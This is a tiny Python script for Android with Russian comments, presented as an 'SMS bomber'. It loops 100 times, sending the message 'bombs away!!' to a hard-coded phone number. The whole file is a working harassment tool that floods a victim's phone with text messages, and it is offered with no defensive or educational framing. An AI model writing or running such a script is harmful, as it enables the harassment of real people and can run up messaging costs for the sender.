#бомбер для смс
import android
d=android.Android()
#1(код региона) номер(7 цифр)
bombed="882 662 847" #примитивный пример номера телефона
#сколько бомб
bombnums=range(100)
msg="бомбы пошли!!"
for i in bombnums:
    d.smsSend(bombed,msg)